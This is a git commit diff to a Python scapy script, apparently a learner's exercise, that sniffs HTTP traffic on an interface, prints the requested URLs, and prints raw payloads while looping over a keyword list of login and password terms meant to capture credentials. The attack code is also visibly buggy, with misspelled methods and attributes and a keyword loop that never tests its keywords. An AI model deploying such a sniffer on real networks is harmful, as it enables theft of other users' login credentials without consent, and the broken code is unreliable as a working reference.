1ebdb8ebba9e225c803d3101e189156854950ade
Ross M <44169316+Scunnered@users.noreply.github.com>
2020-06-15 18:58:46 +0100

    Extracting URLs

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,13 +1,22 @@
 #!/usr/bin/env python
 import scapy.all as scapy
-from scapy.layer import http
+from scapy.layers import http
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 def process_sniffed_packet(packet):
     if packet.hayslayer(http.HTTPREQUEST):
+        url = packet[http.HTTPRequest].Host + packet[HTTPRequest].path
+        print(url)
+
         if packet.haslayer(scapy.Raw):
-            print(packet)
+            load = packet[scapy.Raw].loud
+            keywords = ["Username", "User", "login", "Password", "Pass"]
+            for keyword in keywords:
+                print(load)
+                break
+
+
 
 sniff("eth0")
